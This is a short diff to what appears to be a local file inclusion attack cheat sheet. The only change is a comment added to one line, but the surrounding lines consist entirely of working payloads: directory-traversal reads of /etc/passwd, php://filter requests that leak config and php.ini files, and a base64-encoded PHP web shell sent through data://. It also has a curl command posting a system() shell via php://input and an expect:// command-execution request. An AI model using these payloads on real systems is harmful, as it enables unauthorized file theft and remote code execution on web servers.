@@ -1561,7 +1561,7 @@ $ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; d
 /index.php?language=php://filter/read=convert.base64-encode/resource=config
 /index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 /index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini
-$ echo '<base64 string>' | base64 -d | grep allow_url_include
+$ echo '<base64 string>' | base64 -d | grep allow_url_include        # needed for input wrapper, and any RFI attack
 /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 $ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
 $ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
